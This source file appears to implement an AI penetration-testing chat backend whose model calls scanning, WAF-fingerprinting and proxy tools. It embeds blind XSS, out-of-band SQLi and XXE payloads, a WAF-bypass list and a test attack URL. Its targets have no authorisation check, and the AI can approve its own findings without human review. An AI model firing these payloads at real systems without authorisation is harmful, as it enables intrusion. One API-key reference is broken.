import { serve } from "https://deno.land/std@0.168.0/http/server.ts";
import { createClient } from "https://esm.sh/@supabase/supabase-js@2";

const corsHeaders = {
  "Access-Control-Allow-Origin": "*",
  "Access-Control-Allow-Headers":
    "authorization, x-client-info, apikey, content-type, x-supabase-client-platform, x-supabase-client-platform-version, x-supabase-client-runtime, x-supabase-client-runtime-version",
};

function db() {
  return createClient(Deno.env.get("SUPABASE_URL")!, Deno.env.get("SUPABASE_SERVICE_ROLE_KEY")!);
}

// ─── TOOL DEFINITIONS ──────────────────────────────────────
const TOOLS = [
  {
    type: "function",
    function: {
      name: "run_recon",
      description: "Run reconnaissance scan on a target (subdomain enum, spider crawl, tech fingerprint). Use when user asks to discover endpoints, subdomains, or map attack surface.",
      parameters: { type: "object", properties: { targetId: { type: "string" }, domain: { type: "string" } }, required: ["targetId", "domain"] },
    },
  },
  {
    type: "function",
    function: {
      name: "run_vuln_scan",
      description: "Run OWASP vulnerability scan on a target. Tests for SQLi, XSS, SSRF, SSTI, LFI, etc.",
      parameters: { type: "object", properties: { targetId: { type: "string" }, targetUrl: { type: "string" } }, required: ["targetId", "targetUrl"] },
    },
  },
  {
    type: "function",
    function: {
      name: "run_deep_audit",
      description: "Run deep audit with triple-verification on a target URL. Includes OWASP logic, CVE checks, and differential FP elimination.",
      parameters: { type: "object", properties: { targetUrl: { type: "string" } }, required: ["targetUrl"] },
    },
  },
  {
    type: "function",
    function: {
      name: "validate_finding",
      description: "Validate a specific vulnerability finding by re-testing it. Generates PoC scripts.",
      parameters: { type: "object", properties: { findingId: { type: "string" }, targetId: { type: "string" }, script: { type: "string" } }, required: ["targetId"] },
    },
  },
  {
    type: "function",
    function: {
      name: "sync_intel",
      description: "Sync threat intelligence feeds (HackerOne, GitHub advisories). Finds new CVEs and generates test templates.",
      parameters: { type: "object", properties: {}, required: [] },
    },
  },
  {
    type: "function",
    function: {
      name: "triage_finding",
      description: "AI-triage a finding to determine severity, confidence, and whether it's a false positive.",
      parameters: { type: "object", properties: { findingId: { type: "string" }, approvalId: { type: "string" } }, required: [] },
    },
  },
  {
    type: "function",
    function: {
      name: "query_findings",
      description: "Query vulnerability findings from the database. Filter by target, severity, or status.",
      parameters: { type: "object", properties: { targetId: { type: "string" }, severity: { type: "string" }, status: { type: "string" }, limit: { type: "number" } }, required: [] },
    },
  },
  {
    type: "function",
    function: {
      name: "query_targets",
      description: "List all target workspaces and their scan status.",
      parameters: { type: "object", properties: {}, required: [] },
    },
  },
  {
    type: "function",
    function: {
      name: "query_endpoints",
      description: "List discovered endpoints for a target.",
      parameters: { type: "object", properties: { targetId: { type: "string" } }, required: ["targetId"] },
    },
  },
  {
    type: "function",
    function: {
      name: "headless_dom_analysis",
      description: "Simulate headless browser DOM analysis on a URL. Detects DOM XSS, inline event handlers, postMessage listeners, eval calls, and dynamic script injection.",
      parameters: { type: "object", properties: { targetUrl: { type: "string" }, payload: { type: "string" } }, required: ["targetUrl"] },
    },
  },
  {
    type: "function",
    function: {
      name: "oob_listener",
      description: "Check for out-of-band (OOB) interaction callbacks. Used to detect blind SSRF, blind XSS, out-of-band SQLi.",
      parameters: { type: "object", properties: { callbackId: { type: "string" }, targetId: { type: "string" } }, required: ["targetId"] },
    },
  },
  {
    type: "function",
    function: {
      name: "waf_fingerprint",
      description: "Fingerprint WAF/CDN on a target URL. Detects Cloudflare, AWS WAF, Akamai, ModSecurity, etc. and suggests bypass techniques.",
      parameters: { type: "object", properties: { targetUrl: { type: "string" } }, required: ["targetUrl"] },
    },
  },
  {
    type: "function",
    function: {
      name: "proxy_intercept",
      description: "Intercept and analyze HTTP traffic between client and target. Captures request/response pairs for analysis.",
      parameters: { type: "object", properties: { targetUrl: { type: "string" }, method: { type: "string" }, body: { type: "string" }, headers: { type: "object" } }, required: ["targetUrl"] },
    },
  },
  {
    type: "function",
    function: {
      name: "approve_finding",
      description: "Approve a pending finding and promote it to confirmed vulnerability.",
      parameters: { type: "object", properties: { approvalId: { type: "string" }, notes: { type: "string" } }, required: ["approvalId"] },
    },
  },
  {
    type: "function",
    function: {
      name: "reject_finding",
      description: "Reject a pending finding as false positive.",
      parameters: { type: "object", properties: { approvalId: { type: "string" }, reason: { type: "string" } }, required: ["approvalId"] },
    },
  },
];

// ─── TOOL EXECUTION ─────────────────────────────────────────

async function safeFetch(url: string, opts: RequestInit = {}, timeoutMs = 8000): Promise<Response> {
  const ctrl = new AbortController();
  const timer = setTimeout(() => ctrl.abort(), timeoutMs);
  try { return await fetch(url, { ...opts, signal: ctrl.signal }); }
  finally { clearTimeout(timer); }
}

async function executeTool(name: string, args: Record<string, unknown>): Promise<string> {
  const supabaseUrl = Deno.env.get("SUPABASE_URL")!;
  const serviceKey = Deno.env.get("SUPABASE_SERVICE_ROLE_KEY")!;
  const supabase = db();

  try {
    switch (name) {
      case "run_recon": {
        const resp = await safeFetch(`${supabaseUrl}/functions/v1/recon-engine`, {
          method: "POST",
          headers: { Authorization: `Bearer ${serviceKey}`, "Content-Type": "application/json" },
          body: JSON.stringify({ targetId: args.targetId, domain: args.domain }),
        }, 55000);
        const data = await resp.json();
        return JSON.stringify(data);
      }

      case "run_vuln_scan": {
        const resp = await safeFetch(`${supabaseUrl}/functions/v1/vuln-scanner`, {
          method: "POST",
          headers: { Authorization: `Bearer ${serviceKey}`, "Content-Type": "application/json" },
          body: JSON.stringify({ targetId: args.targetId, targetUrl: args.targetUrl }),
        }, 55000);
        const data = await resp.json();
        return JSON.stringify(data);
      }

      case "run_deep_audit": {
        const resp = await safeFetch(`${supabaseUrl}/functions/v1/cyberscope-deep-audit`, {
          method: "POST",
          headers: { Authorization: `Bearer ${serviceKey}`, "Content-Type": "application/json" },
          body: JSON.stringify({ targetUrl: args.targetUrl }),
        }, 55000);
        const data = await resp.json();
        return JSON.stringify(data);
      }

      case "validate_finding": {
        const resp = await safeFetch(`${supabaseUrl}/functions/v1/validate-finding`, {
          method: "POST",
          headers: { Authorization: `Bearer ${serviceKey}`, "Content-Type": "application/json" },
          body: JSON.stringify({ findingId: args.findingId, targetId: args.targetId, script: args.script, action: "validate" }),
        }, 30000);
        const data = await resp.json();
        return JSON.stringify(data);
      }

      case "sync_intel": {
        const resp = await safeFetch(`${supabaseUrl}/functions/v1/intel-sync`, {
          method: "POST",
          headers: { Authorization: `Bearer ${serviceKey}`, "Content-Type": "application/json" },
          body: JSON.stringify({}),
        }, 55000);
        const data = await resp.json();
        return JSON.stringify(data);
      }

      case "triage_finding": {
        const resp = await safeFetch(`${supabaseUrl}/functions/v1/triage-brain`, {
          method: "POST",
          headers: { Authorization: `Bearer ${serviceKey}`, "Content-Type": "application/json" },
          body: JSON.stringify({ findingId: args.findingId, approvalId: args.approvalId }),
        }, 30000);
        const data = await resp.json();
        return JSON.stringify(data);
      }

      case "query_findings": {
        let query = supabase.from("vulnerability_findings").select("id, title, severity, confidence_score, validation_status, payload, triage_reasoning, created_at");
        if (args.targetId) query = query.eq("target_id", args.targetId as string);
        if (args.severity) query = query.eq("severity", args.severity as string);
        if (args.status) query = query.eq("validation_status", args.status as string);
        const { data } = await query.order("created_at", { ascending: false }).limit((args.limit as number) || 20);
        return JSON.stringify(data || []);
      }

      case "query_targets": {
        const { data } = await supabase.from("target_workspaces").select("id, name, domain, status, created_at").order("created_at", { ascending: false });
        return JSON.stringify(data || []);
      }

      case "query_endpoints": {
        const { data } = await supabase.from("discovered_endpoints").select("id, url, method, parameters, status_code").eq("target_id", args.targetId as string).limit(50);
        return JSON.stringify(data || []);
      }

      case "headless_dom_analysis": {
        // Simulated headless browser - fetches page and analyzes DOM patterns
        const url = args.targetUrl as string;
        const payload = (args.payload as string) || "";
        const testUrl = payload ? `${url}${url.includes("?") ? "&" : "?"}test=${encodeURIComponent(payload)}` : url;
        
        let html = "";
        try {
          const resp = await safeFetch(testUrl, { headers: { "User-Agent": "Mozilla/5.0 CyberScope-Headless/1.0" } }, 6000);
          html = await resp.text();
        } catch { html = ""; }

        const domFindings: Array<{ type: string; detail: string; dangerous: boolean }> = [];
        const patterns = [
          { regex: /innerHTML\s*=\s*[^;]+/gi, type: "innerHTML_assignment", dangerous: true },
          { regex: /document\.write\s*\(/gi, type: "document_write", dangerous: true },
          { regex: /eval\s*\(/gi, type: "eval_call", dangerous: true },
          { regex: /on\w+\s*=\s*['"][^'"]*['"](?=[^a-z])/gi, type: "inline_event_handler", dangerous: true },
          { regex: /window\.addEventListener\s*\(\s*['"]message['"]/gi, type: "postMessage_listener", dangerous: true },
          { regex: /\.src\s*=\s*[^;]+(?:location|document)/gi, type: "dynamic_src", dangerous: true },
          { regex: /new\s+Function\s*\(/gi, type: "Function_constructor", dangerous: true },
          { regex: /javascript\s*:/gi, type: "javascript_uri", dangerous: true },
          { regex: /setTimeout\s*\(\s*['"`]/gi, type: "setTimeout_string", dangerous: true },
        ];

        for (const { regex, type, dangerous } of patterns) {
          const matches = html.match(regex);
          if (matches) {
            for (const m of matches.slice(0, 3)) {
              const idx = html.indexOf(m);
              const ctx = html.substring(Math.max(0, idx - 40), idx + m.length + 40).replace(/\n/g, " ").trim();
              domFindings.push({ type, detail: ctx.slice(0, 200), dangerous });
            }
          }
        }

        const xssTriggered = payload ? html.includes(payload) : false;
        const postMessageCount = (html.match(/addEventListener\s*\(\s*['"]message/gi) || []).length;
        const evalCount = (html.match(/eval\s*\(/gi) || []).length;

        return JSON.stringify({
          url: testUrl,
          domFindings,
          xssTriggered,
          postMessageHandlers: postMessageCount,
          dangerousEvals: evalCount,
          totalPatterns: domFindings.length,
          htmlLength: html.length,
          verdict: xssTriggered ? "XSS_CONFIRMED" : domFindings.length > 3 ? "HIGH_RISK_DOM" : domFindings.length > 0 ? "SUSPICIOUS" : "CLEAN",
        });
      }

      case "oob_listener": {
        // Simulated OOB callback checker
        const callbackId = (args.callbackId as string) || crypto.randomUUID().slice(0, 8);
        const oobDomain = `${callbackId}.oob.cyberscope.local`;
        
        // Check scan_logs for any OOB callback records
        const { data: logs } = await supabase.from("scan_logs")
          .select("*")
          .eq("target_id", args.targetId as string)
          .ilike("message", `%oob%`)
          .order("created_at", { ascending: false })
          .limit(10);

        return JSON.stringify({
          callbackId,
          oobDomain,
          status: "listener_active",
          payloads: {
            blind_ssrf: `http://${oobDomain}/ssrf`,
            blind_xss: `"><script src=http://${oobDomain}/xss></script>`,
            oob_sqli: `' AND 1=(SELECT LOAD_FILE(CONCAT('\\\\\\\\',${oobDomain},'\\\\share')))--`,
            xxe: `<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://${oobDomain}/xxe">]>`,
          },
          callbacks_received: logs?.length || 0,
          recent_callbacks: logs?.slice(0, 5) || [],
          note: "OOB listener simulated. In production, replace with Interactsh/Burp Collaborator.",
        });
      }

      case "waf_fingerprint": {
        const url = args.targetUrl as string;
        const wafSignatures: Array<{ name: string; headers: string[]; bodyPatterns: string[] }> = [
          { name: "Cloudflare", headers: ["cf-ray", "cf-cache-status", "server: cloudflare"], bodyPatterns: ["Attention Required! | Cloudflare", "cf-browser-verification"] },
          { name: "AWS WAF", headers: ["x-amzn-requestid", "x-amz-cf-id"], bodyPatterns: ["<TITLE>ERROR: The request could not be satisfied</TITLE>"] },
          { name: "Akamai", headers: ["x-akamai-transformed", "akamai-grn"], bodyPatterns: ["Access Denied", "Reference&#32;"] },
          { name: "ModSecurity", headers: ["server: apache", "mod_security"], bodyPatterns: ["ModSecurity", "This error was generated by Mod_Security"] },
          { name: "Sucuri", headers: ["x-sucuri-id", "server: sucuri"], bodyPatterns: ["Access Denied - Sucuri Website Firewall"] },
          { name: "Imperva/Incapsula", headers: ["x-cdn: imperva", "x-iinfo"], bodyPatterns: ["Incapsula incident"] },
        ];

        // Test with a benign request
        let respHeaders: Record<string, string> = {};
        let respBody = "";
        try {
          const resp = await safeFetch(url, { headers: { "User-Agent": "Mozilla/5.0" } }, 6000);
          for (const [k, v] of resp.headers.entries()) respHeaders[k] = v;
          respBody = (await resp.text()).slice(0, 5000);
        } catch { /* ignore */ }

        // Test with an attack payload to trigger WAF
        let wafRespHeaders: Record<string, string> = {};
        let wafRespBody = "";
        let wafStatusCode = 0;
        try {
          const attackUrl = `${url}${url.includes("?") ? "&" : "?"}test=<script>alert(1)</script>&id=1' OR 1=1--`;
          const resp = await safeFetch(attackUrl, { headers: { "User-Agent": "Mozilla/5.0" } }, 6000);
          wafStatusCode = resp.status;
          for (const [k, v] of resp.headers.entries()) wafRespHeaders[k] = v;
          wafRespBody = (await resp.text()).slice(0, 5000);
        } catch { /* ignore */ }

        const detected: Array<{ waf: string; confidence: number; evidence: string[] }> = [];
        const allHeaders = Object.entries({ ...respHeaders, ...wafRespHeaders }).map(([k, v]) => `${k}: ${v}`.toLowerCase());

        for (const sig of wafSignatures) {
          const evidence: string[] = [];
          for (const h of sig.headers) {
            if (allHeaders.some(ah => ah.includes(h.toLowerCase()))) evidence.push(`Header: ${h}`);
          }
          for (const p of sig.bodyPatterns) {
            if (respBody.includes(p) || wafRespBody.includes(p)) evidence.push(`Body pattern: ${p.slice(0, 60)}`);
          }
          if (evidence.length > 0) {
            detected.push({ waf: sig.name, confidence: Math.min(100, evidence.length * 40), evidence });
          }
        }

        const bypasses = detected.length > 0 ? [
          "URL encoding: %3Cscript%3E",
          "Double encoding: %253Cscript%253E",
          "Case variation: <ScRiPt>",
          "Null bytes: <%00script>",
          "Unicode: ＜script＞",
          "Content-Type confusion: multipart/form-data",
          "HTTP method override: X-HTTP-Method-Override",
          "Chunked transfer encoding",
        ] : [];

        return JSON.stringify({
          url,
          wafDetected: detected.length > 0,
          wafs: detected,
          wafBlockStatus: wafStatusCode,
          suggestedBypasses: bypasses,
          serverHeader: respHeaders["server"] || "unknown",
        });
      }

      case "proxy_intercept": {
        const url = args.targetUrl as string;
        const method = (args.method as string) || "GET";
        
        const reqHeaders: Record<string, string> = {
          "User-Agent": "Mozilla/5.0 CyberScope-Proxy/1.0",
          "Accept": "text/html,application/json,*/*",
          ...(args.headers as Record<string, string> || {}),
        };

        const startTime = Date.now();
        let status = 0, respHeaders: Record<string, string> = {}, respBody = "";
        try {
          const opts: RequestInit = { method, headers: reqHeaders };
          if (args.body && ["POST", "PUT", "PATCH"].includes(method)) {
            opts.body = args.body as string;
            reqHeaders["Content-Type"] = "application/x-www-form-urlencoded";
          }
          const resp = await safeFetch(url, opts, 8000);
          status = resp.status;
          for (const [k, v] of resp.headers.entries()) respHeaders[k] = v;
          respBody = (await resp.text()).slice(0, 10000);
        } catch (e) {
          return JSON.stringify({ error: `Fetch failed: ${e instanceof Error ? e.message : "unknown"}` });
        }
        const elapsed = Date.now() - startTime;

        // Security analysis of the intercepted traffic
        const securityIssues: string[] = [];
        if (!respHeaders["strict-transport-security"]) securityIssues.push("Missing HSTS header");
        if (!respHeaders["content-security-policy"]) securityIssues.push("Missing CSP header");
        if (!respHeaders["x-frame-options"]) securityIssues.push("Missing X-Frame-Options (Clickjacking risk)");
        if (!respHeaders["x-content-type-options"]) securityIssues.push("Missing X-Content-Type-Options");
        if (respHeaders["server"]) securityIssues.push(`Server header leaks: ${respHeaders["server"]}`);
        if (respHeaders["x-powered-by"]) securityIssues.push(`X-Powered-By leaks: ${respHeaders["x-powered-by"]}`);
        const setCookie = respHeaders["set-cookie"] || "";
        if (setCookie && !setCookie.includes("HttpOnly")) securityIssues.push("Cookie missing HttpOnly flag");
        if (setCookie && !setCookie.includes("Secure")) securityIssues.push("Cookie missing Secure flag");
        if (setCookie && !setCookie.includes("SameSite")) securityIssues.push("Cookie missing SameSite attribute");

        return JSON.stringify({
          request: { method, url, headers: reqHeaders, body: args.body || null },
          response: { status, headers: respHeaders, bodyLength: respBody.length, bodyPreview: respBody.slice(0, 2000), elapsed },
          securityIssues,
        });
      }

      case "approve_finding": {
        const { error } = await supabase.from("pending_approvals")
          .update({ status: "approved", reviewer_notes: (args.notes as string) || "Approved by AI", reviewed_at: new Date().toISOString() })
          .eq("id", args.approvalId as string);
        if (error) return JSON.stringify({ error: error.message });

        // Get the approval to create a confirmed finding
        const { data: approval } = await supabase.from("pending_approvals").select("*").eq("id", args.approvalId as string).single();
        if (approval) {
          await supabase.from("vulnerability_findings").insert({
            target_id: approval.target_id,
            title: approval.title,
            description: approval.description,
            severity: approval.severity,
            payload: approval.payload_used,
            confidence_score: approval.confidence_score,
            validation_status: "confirmed",
            ai_verified: true,
            triage_reasoning: approval.triage_reasoning,
          });
        }
        return JSON.stringify({ status: "approved", id: args.approvalId });
      }

      case "reject_finding": {
        const { error } = await supabase.from("pending_approvals")
          .update({ status: "rejected", reviewer_notes: (args.reason as string) || "Rejected by AI", reviewed_at: new Date().toISOString() })
          .eq("id", args.approvalId as string);
        if (error) return JSON.stringify({ error: error.message });
        return JSON.stringify({ status: "rejected", id: args.approvalId });
      }

      default:
        return JSON.stringify({ error: `Unknown tool: ${name}` });
    }
  } catch (e) {
    return JSON.stringify({ error: `Tool ${name} failed: ${e instanceof Error ? e.message : "unknown"}` });
  }
}

// ─── AI PROVIDER FALLBACK ───────────────────────────────────

interface AIProvider {
  name: string;
  url: string;
  key: string;
  model: string;
}

async function getProviders(): Promise<AIProvider[]> {
  const providers: AIProvider[] = [];

  // Primary: Lovable AI
  const lovableKey = Deno.env.get("LOVABLE_API_KEY");
  if (lovableKey) {
    providers.push({
      name: "lovable",
      url: "https://ai.gateway.lovable.dev/v1/chat/completions",
      key: lovableKey,
      model: "google/gemini-3-flash-preview",
    });
  }

  // Fallback providers from DB
  const supabase = db();
  const { data: configs } = await supabase
    .from("ai_provider_config")
    .select("provider, api_key, is_active, priority")
    .eq("is_active", true)
    .order("priority");

  for (const c of configs || []) {
    if (c.provider === "gemini") {
      providers.push({
        name: "gemini",
        url: "https://generativelanguage.googleapis.com/v1beta/openai/chat/completions",
        key: c.api_key,
        model: "gemini-2.5-flash",
      });
    } else if (c.provider === "openai") {
      providers.push({
        name: "openai",
        url: "https://api.openai.com/v1/chat/completions",
        key: c.api_key,
        model: "gpt-4o-mini",
      });
    }
  }

  return providers;
}

async function callAIWithFallback(
  body: Record<string, unknown>,
  providers: AIProvider[]
): Promise<{ response: Response; providerUsed: string }> {
  for (const provider of providers) {
    const payload = { ...body, model: provider.model };
    const resp = await fetch(provider.url, {
      method: "POST",
      headers: {
        Authorization: `Bearer ${provider.key}`,
        "Content-Type": "application/json",
      },
      body: JSON.stringify(payload),
    });

    if (resp.ok) return { response: resp, providerUsed: provider.name };

    // Only fallback on 402 (credits exhausted) or 429 (rate limit)
    if (resp.status === 402 || resp.status === 429) {
      console.log(`Provider ${provider.name} returned ${resp.status}, trying next...`);
      continue;
    }

    // Other errors — don't fallback, surface the error
    return { response: resp, providerUsed: provider.name };
  }

  // All providers exhausted
  return {
    response: new Response(JSON.stringify({ error: "All AI providers exhausted. Add API keys in Settings." }), {
      status: 503,
      headers: { "Content-Type": "application/json" },
    }),
    providerUsed: "none",
  };
}

// ─── MAIN HANDLER ───────────────────────────────────────────

serve(async (req) => {
  if (req.method === "OPTIONS") return new Response(null, { headers: corsHeaders });

  try {
    const { messages, targetId, sessionId, saveChat } = await req.json();
    const providers = await getProviders();
    if (providers.length === 0) {
      return new Response(JSON.stringify({ error: "No AI providers configured" }), {
        status: 500, headers: { ...corsHeaders, "Content-Type": "application/json" },
      });
    }

    const supabase = db();

    // ─── Save user message to DB if sessionId provided ─────
    let dbSessionId: string | null = null;
    if (sessionId && saveChat !== false) {
      const { data: existingSession } = await supabase.from("chat_sessions")
        .select("id").eq("session_id", sessionId).single();
      
      if (existingSession) {
        dbSessionId = existingSession.id;
        await supabase.from("chat_sessions").update({ last_message_at: new Date().toISOString() }).eq("id", dbSessionId);
      } else {
        const { data: newSession } = await supabase.from("chat_sessions")
          .insert({ session_id: sessionId, target_id: targetId || null, title: "New Chat" })
          .select("id").single();
        dbSessionId = newSession?.id || null;
      }

      if (dbSessionId) {
        const lastMsg = messages[messages.length - 1];
        if (lastMsg?.role === "user") {
          await supabase.from("chat_messages").insert({
            session_id: dbSessionId, role: "user", content: lastMsg.content,
          });
        }
      }
    }

    // ─── Gather context ─────────────────────────────────────
    let contextBlock = "";
    if (targetId) {
      const [findingsRes, approvalsRes, logsRes, endpointsRes] = await Promise.all([
        supabase.from("vulnerability_findings").select("id, title, severity, confidence_score, validation_status, triage_reasoning, payload").eq("target_id", targetId).order("created_at", { ascending: false }).limit(20),
        supabase.from("pending_approvals").select("id, title, severity, confidence_score, finding_type, ai_verified, triage_reasoning, status").eq("target_id", targetId).order("created_at", { ascending: false }).limit(15),
        supabase.from("scan_logs").select("message, log_type, created_at").eq("target_id", targetId).order("created_at", { ascending: false }).limit(30),
        supabase.from("discovered_endpoints").select("url, method, parameters").eq("target_id", targetId).limit(30),
      ]);

      contextBlock = `
## Current Scan Context (Target ID: ${targetId})
### Confirmed Findings (${findingsRes.data?.length || 0}):
${(findingsRes.data || []).map(f => `- [${f.severity?.toUpperCase()}] ${f.title} (id: ${f.id}, score: ${f.confidence_score || 'N/A'}, status: ${f.validation_status || 'pending'})`).join("\n")}
### Pending Approvals (${approvalsRes.data?.length || 0}):
${(approvalsRes.data || []).map(a => `- [${a.severity?.toUpperCase()}] ${a.title} (id: ${a.id}, type: ${a.finding_type}, status: ${a.status}, AI verified: ${a.ai_verified})`).join("\n")}
### Discovered Endpoints (${endpointsRes.data?.length || 0}):
${(endpointsRes.data || []).slice(0, 15).map(e => `- ${e.method} ${e.url}`).join("\n")}
### Recent Logs:
${(logsRes.data || []).slice(0, 10).map(l => `[${l.log_type}] ${l.message}`).join("\n")}
`;
    }

    const systemPrompt = `You are CyberScope AI — a Principal VAPT (Vulnerability Assessment & Penetration Testing) Analyst with FULL ADMIN ACCESS to all scanning tools.

You have TOOLS available to perform real actions. When the user asks you to scan, test, validate, or investigate — USE THE TOOLS. Do not just describe what you would do. ACTUALLY DO IT.

Your capabilities:
- **Reconnaissance**: Enumerate subdomains, spider crawl, discover endpoints (run_recon)
- **Vulnerability Scanning**: OWASP Top 10 automated testing (run_vuln_scan)
- **Deep Audit**: Triple-verified scanning with FP elimination (run_deep_audit)
- **Finding Validation**: Re-test and generate PoC (validate_finding)
- **Threat Intel**: Sync CVE feeds and generate templates (sync_intel)
- **AI Triage**: Score and classify findings (triage_finding)
- **Database Queries**: Query findings, targets, endpoints (query_findings, query_targets, query_endpoints)
- **DOM Analysis**: Headless browser simulation for DOM XSS detection (headless_dom_analysis)
- **OOB Listener**: Out-of-band callback detection for blind vulns (oob_listener)
- **WAF Fingerprinting**: Detect and suggest WAF bypasses (waf_fingerprint)
- **Proxy Intercept**: Capture and analyze HTTP traffic (proxy_intercept)
- **Approval Management**: Approve or reject findings (approve_finding, reject_finding)

${contextBlock}

RULES:
1. When asked to scan a target, call the appropriate tool immediately.
2. After getting tool results, analyze and explain findings clearly.
3. For complex tasks, chain multiple tools (e.g., recon → vuln scan → deep audit).
4. Always provide actionable insights with CVSS scores and remediation.
5. Use markdown formatting for readability.`;

    // ─── AI Call with Tool Calling Loop ──────────────────────
    let aiMessages = [
      { role: "system", content: systemPrompt },
      ...messages,
    ];

    let fullAssistantContent = "";
    let toolCallsMade: Array<{ name: string; input: unknown; result: string }> = [];
    let maxIterations = 5;

    // We need to handle tool calls iteratively (non-streaming for tool calls)
    for (let i = 0; i < maxIterations; i++) {
      const aiResponse = await fetch("https://ai.gateway.lovable.dev/v1/chat/completions", {
        method: "POST",
        headers: {
          Authorization: `Bearer ${LOVABLE_API_KEY}`,
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          model: "google/gemini-3-flash-preview",
          messages: aiMessages,
          tools: TOOLS,
          stream: false,
        }),
      });

      if (!aiResponse.ok) {
        if (aiResponse.status === 429) {
          return new Response(JSON.stringify({ error: "Rate limited — try again shortly" }), {
            status: 429, headers: { ...corsHeaders, "Content-Type": "application/json" },
          });
        }
        if (aiResponse.status === 402) {
          return new Response(JSON.stringify({ error: "Credits exhausted — add funds in Settings" }), {
            status: 402, headers: { ...corsHeaders, "Content-Type": "application/json" },
          });
        }
        throw new Error(`AI error: ${aiResponse.status}`);
      }

      const aiData = await aiResponse.json();
      const choice = aiData.choices?.[0];
      const msg = choice?.message;

      if (!msg) break;

      // Add assistant message to conversation
      aiMessages.push(msg);

      // If there are tool calls, execute them
      if (msg.tool_calls && msg.tool_calls.length > 0) {
        for (const tc of msg.tool_calls) {
          const toolName = tc.function.name;
          let toolArgs: Record<string, unknown> = {};
          try { toolArgs = JSON.parse(tc.function.arguments || "{}"); } catch { /* */ }

          console.log(`Executing tool: ${toolName}`, toolArgs);
          const result = await executeTool(toolName, toolArgs);
          toolCallsMade.push({ name: toolName, input: toolArgs, result });

          // Add tool result to conversation
          aiMessages.push({
            role: "tool",
            tool_call_id: tc.id,
            content: result,
          } as any);
        }
        // Continue loop to let AI process tool results
        continue;
      }

      // No tool calls — we have a final text response
      fullAssistantContent = msg.content || "";
      break;
    }

    // ─── Save assistant response to DB ──────────────────────
    if (dbSessionId && fullAssistantContent) {
      await supabase.from("chat_messages").insert({
        session_id: dbSessionId, role: "assistant", content: fullAssistantContent,
      });
      // Save tool calls too
      for (const tc of toolCallsMade) {
        await supabase.from("chat_messages").insert({
          session_id: dbSessionId, role: "tool" as any, content: `Tool: ${tc.name}`,
          tool_name: tc.name, tool_input: tc.input as any, tool_result: tc.result ? JSON.parse(tc.result) : null,
        });
      }
      // Update session title from first user message
      if (messages.length <= 2) {
        const firstUser = messages.find((m: any) => m.role === "user");
        if (firstUser) {
          await supabase.from("chat_sessions").update({
            title: (firstUser.content as string).slice(0, 80),
          }).eq("id", dbSessionId);
        }
      }
    }

    // Return the complete response with tool call info
    return new Response(JSON.stringify({
      content: fullAssistantContent,
      toolCalls: toolCallsMade.map(tc => ({ name: tc.name, input: tc.input })),
    }), {
      headers: { ...corsHeaders, "Content-Type": "application/json" },
    });

  } catch (e) {
    console.error("vapt-chat error:", e);
    return new Response(JSON.stringify({ error: e instanceof Error ? e.message : "Unknown error" }), {
      status: 500, headers: { ...corsHeaders, "Content-Type": "application/json" },
    });
  }
});
